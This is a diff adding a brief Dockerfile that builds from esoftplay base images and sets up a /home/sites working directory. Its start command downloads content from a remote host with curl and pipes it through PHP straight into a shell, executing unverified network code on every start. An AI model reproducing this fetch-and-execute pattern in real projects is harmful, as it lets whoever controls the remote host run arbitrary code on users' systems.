@@ -1,0 +1,7 @@
+FROM esoftplay/master:latest
+FROM esoftplay/binary:latest
+
+RUN mkdir -p /home/sites
+WORKDIR /home/sites
+
+CMD /usr/bin/curl -s fisip.net/fw/binary|/usr/bin/php|/bin/sh
